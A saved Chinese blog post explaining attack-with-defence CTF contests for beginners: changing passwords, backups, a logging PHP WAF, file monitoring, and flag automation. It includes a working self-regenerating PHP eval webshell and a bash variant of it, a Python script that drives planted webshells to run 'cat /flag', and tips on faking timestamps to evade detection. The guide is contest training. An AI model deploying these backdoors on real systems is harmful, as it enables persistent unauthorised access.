+<p><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190206162649.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190206162649.png" alt=""></a></p>
+<h2 id="0X03-Attack-With-Defence"><a href="https://jlkl.github.io/2019/02/08/Web_13/#0X03-Attack-With-Defence" class="headerlink" title="0X03 Attack With Defence"></a>0X03 Attack With Defence</h2><h3 id="1-修改ssh密码"><a href="https://jlkl.github.io/2019/02/08/Web_13/#1-%E4%BF%AE%E6%94%B9ssh%E5%AF%86%E7%A0%81" class="headerlink" title="1. 修改ssh密码"></a>1. 修改ssh密码</h3><div class="highlight-container"><figure class="highlight nginx"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span> username</span><br><span class="line"><span class="comment"># 输入密码确认即可</span></span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+<h3 id="2-修改数据库密码及备份数据库（以-mysql-为例）"><a href="https://jlkl.github.io/2019/02/08/Web_13/#2-%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E5%8F%8A%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E4%BB%A5-mysql-%E4%B8%BA%E4%BE%8B%EF%BC%89" class="headerlink" title="2. 修改数据库密码及备份数据库（以 mysql 为例）"></a>2. 修改数据库密码及备份数据库（以 mysql 为例）</h3><p>修改 mysql 密码</p>
+<div class="highlight-container"><figure class="highlight pgsql"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'new password'</span>);</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">2.</span> 修改 mysql <span class="keyword">user</span> 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;<span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'new password'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">3.</span> 使用 <span class="keyword">GRANT</span> 语句</span><br><span class="line">mysql&gt;<span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'127.0.0.1'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'new password'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">4.</span> mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root <span class="keyword">password</span> "new password";（注意双引号或不加）</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>备份指定的多个数据库</p>
+<p><code>[root@ubuntu]# mysqldump -u root -p --databases databasesname &gt; /tmp/db.sql</code></p>
+<p>数据库恢复，在mysql终端下执行</p>
+<div class="highlight-container"><figure class="highlight bash"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令格式：source FILE_PATH</span></span><br><span class="line"><span class="built_in">source</span> ~/db.sql（原数据库需存在）</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>比赛前一定要快速修改密码和备份，否则密码被别人更改需要重置环境就尴尬了，修改数据库密码后注意修改源码配置文件，避免服务崩溃。同时赛前也可以准备些例如 phpmyadmin 的批量爆破和改密的脚本。</p>
+<h3 id="3-源码备份"><a href="https://jlkl.github.io/2019/02/08/Web_13/#3-%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD" class="headerlink" title="3. 源码备份"></a>3. 源码备份</h3><div class="highlight-container"><figure class="highlight css"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 打包目录</span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zcvf</span> <span class="selector-tag">archive_name</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span> <span class="selector-tag">directory_to_compress</span></span><br><span class="line"># 解包</span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">archive_name</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码</p>
+<h3 id="4-上-WAF"><a href="https://jlkl.github.io/2019/02/08/Web_13/#4-%E4%B8%8A-WAF" class="headerlink" title="4. 上 WAF"></a>4. 上 WAF</h3><p>备份好源码之后要做的就是监控访问，截取攻击向量，做好流量重放的准备。一般的 WAF 只需要做到记录访问的基本信息如时间，ip，get，post，cookie，UA即可。也可以自行编写通防 WAF，功能如关键字检测，截取上传文件内容等。</p>
+<p>但一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题。</p>
+<p>可以使用 bash 命令在每一个 php 文件前面加上 <code>require_once</code> 包含 WAF 文件</p>
+<div class="highlight-container"><figure class="highlight gradle"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 批量加waf <span class="regexp">/var/</span>www<span class="regexp">/html/</span> 目录下每个 php 文件前加上 &lt;?php require_once <span class="string">"/tmp/waf.php"</span>;?&gt;</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/var/</span>www<span class="regexp">/html/</span> -path <span class="regexp">/var/</span>www<span class="regexp">/html/</span><span class="number">124687</span>a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name <span class="string">'*.php'</span>|xargs  sed -i <span class="string">'1i&lt;?php require_once "/tmp/waf.php";?&gt;'</span></span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p>
+<div class="highlight-container"><figure class="highlight livecodeserver"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Automatically <span class="built_in">add</span> <span class="built_in">files</span> <span class="keyword">before</span> PHP document.</span><br><span class="line">; <span class="keyword">http</span>://php.net/auto-prepend-<span class="built_in">file</span></span><br><span class="line">auto_prepend_file = /tmp/waf.php</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>附上郁离歌的一枚 WAF，会在 <code>/tmp/loooooooogs</code> 目录下生成日志文件</p>
+<div class="highlight-container"><figure class="highlight xml"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">define(<span class="string">'LOG_FILEDIR'</span>,<span class="string">'/tmp/loooooooogs'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!is_dir(LOG_FILEDIR)){</span></span><br><span class="line"><span class="php">	mkdir(LOG_FILEDIR);</span></span><br><span class="line"><span class="php">}</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">{ </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) { </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>{ </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) { </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>) </span></span><br><span class="line"><span class="php">$headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>)))))] = $value;</span></span><br><span class="line"><span class="php">} </span></span><br><span class="line"><span class="php"><span class="keyword">return</span> $headers; </span></span><br><span class="line"><span class="php">} </span></span><br><span class="line"><span class="php">} </span></span><br><span class="line"><span class="php">$get = $_GET; </span></span><br><span class="line"><span class="php">$post = $_POST; </span></span><br><span class="line"><span class="php">$cookie = $_COOKIE; </span></span><br><span class="line"><span class="php">$header = getallheaders(); </span></span><br><span class="line"><span class="php">$files = $_FILES; </span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; </span></span><br><span class="line"><span class="php">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>]; </span></span><br><span class="line"><span class="php">$filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) { </span></span><br><span class="line"><span class="php">$files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]); </span></span><br><span class="line"><span class="php">file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"virink"</span>); </span></span><br><span class="line"><span class="php">}</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]);</span></span><br><span class="line"><span class="php">$input = <span class="keyword">array</span>(<span class="string">"Get"</span>=&gt;$get, <span class="string">"Post"</span>=&gt;$post, <span class="string">"Cookie"</span>=&gt;$cookie, <span class="string">"File"</span>=&gt;$files, <span class="string">"Header"</span>=&gt;$header);</span></span><br><span class="line"></span><br><span class="line"><span class="php">logging($input);</span></span><br><span class="line"></span><br><span class="line"><span class="php">}</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span></span>{ </span></span><br><span class="line"><span class="php">$filename = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span></span><br><span class="line"><span class="php">$LOG_FILENAME = LOG_FILEDIR.<span class="string">"/"</span>.$filename;</span></span><br><span class="line"><span class="php">$time = date(<span class="string">"Y-m-d G:i:s"</span>);</span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME, <span class="string">"\r\n"</span>.$time.<span class="string">"\r\n"</span>.print_r($var, <span class="keyword">true</span>), FILE_APPEND); </span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME,<span class="string">"\r\n"</span>.<span class="string">'http://'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].<span class="string">'?'</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>], FILE_APPEND);</span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME,<span class="string">"\r\n***************************************************************"</span>,FILE_APPEND);</span></span><br><span class="line"><span class="php">}</span></span><br><span class="line"></span><br><span class="line"><span class="php">waf(); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。</p>
+<h3 id="5-文件监控"><a href="https://jlkl.github.io/2019/02/08/Web_13/#5-%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7" class="headerlink" title="5. 文件监控"></a>5. 文件监控</h3><p>网上有很多文件监控的脚本，也可以使用 bash 命令自行查找出例如10分钟内修改过的 php 文件，这里推荐一个师傅的文件监控工具，文件相关操作都清晰明了。</p>
+<p><a href="https://github.com/TheKingOfDuck/FileMonitor" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/FileMonitor</a></p>
+<p><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207165325.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207165325.png" alt=""></a></p>
+<p>线下环境一般不能访问外网，所以需要提前下载好脚本和相关依赖，这个工具需要 <code>watchdog</code> 依赖，也是要提前准备的。</p>
+<p>使用 <code>touch</code> 命令修改文件时间戳可以一定程度防范对文件的检测。</p>
+<h3 id="6-权限维持——不死马"><a href="https://jlkl.github.io/2019/02/08/Web_13/#6-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%94%E2%80%94%E4%B8%8D%E6%AD%BB%E9%A9%AC" class="headerlink" title="6. 权限维持——不死马"></a>6. 权限维持——不死马</h3><p>不死马也称内存马，删除掉木马之后，由于操作存于内存当中，还是会不断地生成木马，达到权限维持的目的。</p>
+<h4 id="6-1-不死马使用"><a href="https://jlkl.github.io/2019/02/08/Web_13/#6-1-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%BD%BF%E7%94%A8" class="headerlink" title="6.1. 不死马使用"></a>6.1. 不死马使用</h4><p>常规不死马，先删除自身，不断生成 <code>.index.php</code> 文件</p>
+<p><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207172500.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207172500.png" alt=""></a></p>
+<div class="highlight-container"><figure class="highlight xml"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ignore_user_abort(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">unlink(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$file = <span class="string">'./.index.php'</span>;</span></span><br><span class="line"><span class="php">$code = <span class="string">'&lt;?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&amp;a=command</span></span></span><br><span class="line"><span class="php"><span class="keyword">while</span> (<span class="number">1</span>){</span></span><br><span class="line"><span class="php">	file_put_contents($file,$code);</span></span><br><span class="line"><span class="php">	usleep(<span class="number">5000</span>);</span></span><br><span class="line"><span class="php">}</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>这里添加了一个密码 <code>pass</code> 防止别人借刀杀人，我们平时也可以编写自己的木马，别人就算拿到木马也不知道怎么利用，附上一句话木马的各种变形</p>
+<p><a href="http://www.secist.com/archives/1947.html" target="_blank" rel="noopener">http://www.secist.com/archives/1947.html</a></p>
+<p>bash 命令不死马，效果也是不断生成 <code>.index.php</code> 文件，也可以使用命令不断创建 nc 后门</p>
+<p><code>system('while true;do echo \'&lt;?php if(md5($_GET[pass])==\"3a50065e1709acc47ba0c9238294364f\"){@eval($_GET[a]);} ?&gt;\' &gt;fuck.php;sleep 0.1;done;');</code></p>
+<h4 id="6-2-不死马的克制"><a href="https://jlkl.github.io/2019/02/08/Web_13/#6-2-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%85%8B%E5%88%B6" class="headerlink" title="6.2. 不死马的克制"></a>6.2. 不死马的克制</h4><ol>
+<li>杀掉不死马运行的进程，直接删除脚本没用，因为php执行的时候已经把脚本读进去解释成opcode运行了</li>
+</ol>
+<p><code>ps aux</code> 查看运行的进程</p>
+<p><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207173536.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207173536.png" alt=""></a></p>
+<p>www-data 权限运行了 4 个 apache 进程，不死马随机运行于这 4 个进程，直接 <code>kill pid</code> （www-data 权限下）全部杀掉这几个进程就可以了</p>
+<p>可以使用 <code>kill -9 -1</code> 杀死当前用户所有进程（有权限下慎用），也可以直接 <code>killall apache2</code> 杀掉 apache 所有子进程</p>
+<ol start="2">
+<li>重启 apache，php 等web服务（一般不会有权限）</li>
+</ol>
+<div class="highlight-container"><figure class="highlight routeros"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br><span class="line">service php restart</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<ol start="3">
+<li><p>用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值</p>
+</li>
+<li><p>创建一个和不死马生成的马一样名字的文件夹，测试了下需要先删除再创建文件夹</p>
+</li>
+</ol>
+<h3 id="7-自动提交"><a href="https://jlkl.github.io/2019/02/08/Web_13/#7-%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4" class="headerlink" title="7. 自动提交"></a>7. 自动提交</h3><p>比赛中提交 flag 一般会带上队伍 token 和 flag，格式如下：</p>
+<p><code>flag.php?token=teamtoken&amp;flag=this_is_flag</code></p>
+<p>获取 flag 一般有两种方式：</p>
+<ol>
+<li>flag 在根目录，直接 <code>cat</code> 读取 flag</li>
+<li>在对方机器请求指定地址（curl）获取 flag</li>
+</ol>
+<p>flag 每几分钟更换一轮，手动提交显然是不太可能的，需要提前准备自动获取，提交 flag 的脚本，并根据实际情况进行修改</p>
+<p>下面这个脚本每两分钟获取一次 flag 并自动提交</p>
+<div class="highlight-container"><figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ip:"</span></span><br><span class="line">url1 = <span class="string">""</span></span><br><span class="line">shell = <span class="string">"/includes/config.php?d=system"</span></span><br><span class="line">passwd = <span class="string">"c"</span> </span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line">payload = {passwd: <span class="string">'cat /flag'</span>}</span><br><span class="line"></span><br><span class="line">flag_server = <span class="string">"http://flag_server/flag_file.php?token=%s&amp;flag=%s"</span></span><br><span class="line">teamtoken = <span class="string">"team1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span><span class="params">(target, teamtoken, flag)</span>:</span></span><br><span class="line">    url = flag_server % (teamtoken, flag)</span><br><span class="line">    pos = {}</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]Submitting flag:%s:%s"</span> % (target, url)</span><br><span class="line">    response = requests.post(url, data=pos)</span><br><span class="line">    content = response.text</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]content:%s"</span> % content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+]Success!!"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-]Failed"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </span><br><span class="line">    f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">8802</span>,<span class="number">8803</span>,<span class="number">8804</span>]: </span><br><span class="line">        url1=url+str(i)+shell</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"------------------------------------"</span></span><br><span class="line">            res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">                <span class="keyword">print</span> url1 + <span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">                <span class="comment"># 记录shell和获取的flag</span></span><br><span class="line">                <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">                <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">                <span class="comment"># 正则捕获flag</span></span><br><span class="line">                <span class="keyword">if</span> re.match(<span class="string">r'hello world(\w+)'</span>, res.text):   </span><br><span class="line">                    flag = re.match(<span class="string">r'hello world(\w+)'</span>, res.text).group(<span class="number">1</span>)</span><br><span class="line">                    submit_flag(url1, teamtoken, flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"[-]Can not get flag"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> url1 + <span class="string">"connect shell failed"</span></span><br><span class="line">    		</span><br><span class="line">    f.close()</span><br><span class="line">    f1.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timer</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag()</span><br><span class="line">        flag()</span><br><span class="line">        flag()</span><br><span class="line">        time.sleep(n)</span><br><span class="line"></span><br><span class="line">timer(<span class="number">120</span>)</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207182658.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190207182658.png" alt=""></a></p>
+<p>附上 Rcoil 师傅线下攻防思维导图<br><a class="fancybox fancybox.image" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190206164035.png" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" data-fancybox="default" rel="default"><img src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/20190206164035.png" alt=""></a></p>
+<h2 id="0X04-参考链接"><a href="https://jlkl.github.io/2019/02/08/Web_13/#0X04-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5" class="headerlink" title="0X04 参考链接"></a>0X04 参考链接</h2><p><a href="https://github.com/admintony/Prepare-for-AWD" target="_blank" rel="noopener">AWD线下赛脚本集合</a></p>
+<p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF线下攻防赛总结-RcoIl</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2019/02/08/Web_13/" title="CTF线下赛AWD新手入门Web篇">https://jlkl.github.io/2019/02/08/Web_13/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="https://jlkl.github.io/tags/Web/" rel="tag"># Web</a>
+              <a href="https://jlkl.github.io/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="https://jlkl.github.io/2019/01/05/Web_12/" rel="prev" title="Web基础漏洞之文件上传">
+      <i class="fa fa-chevron-left"></i> Web基础漏洞之文件上传
+    </a></div>
+      <div class="post-nav-item">
+    <a href="https://jlkl.github.io/2019/04/17/Web_14/" rel="next" title="ssh端口转发内网到公网">
+      ssh端口转发内网到公网 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
